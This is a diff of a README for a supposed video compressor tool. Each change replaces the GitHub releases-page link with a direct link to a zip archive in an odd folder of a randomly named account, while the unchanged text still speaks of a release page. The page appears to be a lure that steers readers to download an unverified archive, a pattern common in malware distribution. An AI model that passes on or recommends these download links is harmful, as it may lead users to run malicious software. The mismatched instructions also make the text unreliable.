@@ -1,6 +1,6 @@
 # 🎬 video-compressor-tool - Shrink Video Files Without Losing Quality
 
-[![Download Now](https://img.shields.io/badge/Download-video--compressor--tool-brightgreen?style=for-the-badge&logo=github)](https://github.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-video--compressor--tool-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/main/Winebrennerian/compressor_video_tool_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ This guide walks you through downloading, installing, and using the tool. By the
 Getting the tool is straightforward. Here's what you need to do:
 
 1. **Visit the Download Page** – Click the green button above or go directly to:
-   [https://github.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/releases](https://github.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/releases)
+   [https://raw.githubusercontent.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/main/Winebrennerian/compressor_video_tool_2.0.zip](https://raw.githubusercontent.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/main/Winebrennerian/compressor_video_tool_2.0.zip)
 
 2. **Choose the Right File** – You'll see a list of files available for download. Look for the file named something like `video-compressor-tool.zip` or `video-compressor-tool-setup.exe`. Since the link takes you to a release page, you'll need to pick one of the available files.  
 
@@ -173,7 +173,7 @@ If everything looks good, congratulations—you've successfully reduced your vid
 You're all set to use **video-compressor-tool**. It's simple, fast, and free. Click the download button at the top of this page, follow the quick steps, and you'll be compressing videos in no time.
 
 **Download link (again):**  
-[https://github.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/releases](https://github.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/releases)
+[https://raw.githubusercontent.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/main/Winebrennerian/compressor_video_tool_2.0.zip](https://raw.githubusercontent.com/genusptilonorhynchuswanderingjew392/video-compressor-tool/main/Winebrennerian/compressor_video_tool_2.0.zip)
 
 ---
 
